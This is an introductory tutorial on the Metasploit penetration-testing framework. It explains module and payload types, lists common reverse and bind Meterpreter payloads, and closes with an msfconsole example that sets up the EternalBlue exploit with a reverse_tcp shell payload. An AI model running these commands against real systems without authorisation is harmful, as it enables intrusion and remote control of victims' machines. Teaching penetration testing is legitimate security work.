What is Metasploit Framework?

Metasploit is an open-source penetration testing framework that provides:

Exploits â†’ Pre-built code for exploiting specific vulnerabilities.

Payloads â†’ Malicious code delivered after exploitation (reverse shell, Meterpreter, etc.).

Auxiliary modules â†’ Scanners, fuzzers, and enumeration tools.

Post-exploitation modules â†’ Tools to maintain access and gather info after exploitation.

ðŸ”¹ Types of Payloads in Metasploit

Metasploit supports multi-payloads depending on the target and situation:

1. Singles

Self-contained payloads that perform one action.

Example: Add a user, execute a command.

2. Stagers

Small pieces of code that set up a connection between attacker and victim.

Used to load larger payloads.

Example: windows/meterpreter/reverse_tcp (creates a TCP connection back).

3. Stages

Larger payloads delivered by the stager.

Example: Meterpreter, VNC inject, shell.

ðŸ”¹ Common Metasploit Payloads

windows/meterpreter/reverse_tcp â†’ Reverse shell with full Meterpreter features.

windows/meterpreter/bind_tcp â†’ Opens a listening port on the victim machine.

linux/x86/meterpreter/reverse_tcp â†’ Linux Meterpreter shell.

android/meterpreter/reverse_tcp â†’ Remote access payload for Android.

php/meterpreter/reverse_tcp â†’ Payload for exploiting PHP apps.

ðŸ”¹ Example Usage

Start Metasploit:

msfconsole


Search for exploit:

search ms17_010


Use exploit:

use exploit/windows/smb/ms17_010_eternalblue


Set target & payload:

set payload windows/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT 4444


Exploit:

exploit


âš¡ Metasploit is powerful because you can switch payloads (multi-payload) depending on the target â€” Windows, Linux, Android, macOS, PHP, etc.
